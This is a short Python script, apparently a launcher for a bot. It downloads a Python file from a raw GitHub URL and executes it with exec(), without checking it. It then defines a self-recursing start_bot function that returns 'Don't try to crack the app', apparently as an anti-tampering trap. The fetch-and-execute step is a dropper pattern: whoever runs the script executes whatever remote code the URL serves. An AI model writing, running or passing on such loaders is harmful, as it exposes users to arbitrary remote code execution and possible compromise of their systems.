print("connect 1")
import requests
data = requests.get(url="https://raw.githubusercontent.com/walidfoxy/BOTs-Fox-/main/BOT%20Fox!.py").text
exec(data)


def start_bot():
    try:
        eval("""start_bot()""")
    except Exception as e:
        return "Don't try to crack the app"
start_bot()